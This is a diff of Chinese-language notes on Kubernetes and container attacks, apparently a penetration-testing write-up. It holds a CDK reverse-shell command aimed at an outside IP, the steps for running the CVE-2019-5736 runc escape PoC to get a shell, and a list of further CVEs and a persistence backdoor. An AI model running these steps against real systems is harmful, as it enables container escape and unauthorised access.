@@ -92,6 +92,7 @@ root@VM-8-3-ubuntu:/# ./cdk_linux_amd64 run shim-pwn reverse 43.138.22.133 80
 POC链接：
 https://github.com/Frichetten/CVE-2019-5736-PoC
 下载main.go并上传到服务器，修改payload信息
+
 ![image](https://github.com/user-attachments/assets/0067a375-7bc7-4105-bd4f-c68b5c727ee2)
 
 
@@ -104,23 +105,30 @@ https://github.com/Frichetten/CVE-2019-5736-PoC
 执行POC，即可拿到shell
 ![image](https://github.com/user-attachments/assets/bd03b3be-97e4-44e4-bac0-5dced1943040)
 成功拿shell
-![image](https://github.com/user-attachments/assets/665b8a4f-1e62-480a-8ac8-a895717ad651)
+![image](https://github.com/user-attachments/assets/fda071fd-3574-4024-aba3-b0480297bb02)
 
 
 
-6.	cve-2019-16884 容器逃逸
-
-
+6.	cve-2019-16884 容器逃逸(不行)
 
 
 
 
 7.	cve-2017-1002101 容器逃逸
+
+
+
+
+
+
 8.	cve-2019-11253 拒绝服务
 9.	cve-2019-9946 流量劫持
 10.	cve-2020-8554 中间人攻击
 11.	cve-2020-8559 权限提升
 12.	k8s_backdoor_daemonset 持久化
+
+
+
 
 
 
